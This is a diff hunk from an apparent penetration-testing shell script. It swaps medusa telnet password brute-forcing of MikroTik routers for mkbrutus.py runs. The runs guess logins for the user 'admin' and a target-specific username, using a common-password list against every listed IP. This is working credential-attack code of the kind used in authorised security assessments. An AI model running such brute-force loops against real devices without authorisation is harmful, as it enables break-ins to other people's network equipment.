@@ -127,9 +127,10 @@ then
 	  echo -e "$OKBLUE\n\t#################### Testing common pass MikroTik ######################$RESET"	
 	  for ip in $(cat .services/MikroTik.txt); do		
 		echo -e "\n\t########### $ip #######"			
-		medusa -e n -u admin -P top.txt -h $ip -M telnet | tee -a  logs/cracking/$ip-MikroTik.txt		
-		medusa -e n -u $entidad  -P top.txt -h $ip -M telnet | tee -a  logs/cracking/$ip-MikroTik.txt
-		grep --color=never SUCCESS logs/cracking/$ip-MikroTik.txt > vulnerabilities/$ip-MikroTik-password.txt
+				
+		mkbrutus.py -t $ip -u admin -d top.txt | tee -a  logs/cracking/$ip-MikroTik.txt
+		mkbrutus.py -t $ip -u $entidad -d top.txt | tee -a  logs/cracking/$ip-MikroTik.txt
+		
 		echo ""			
 	 done
 	fi # if bruteforce
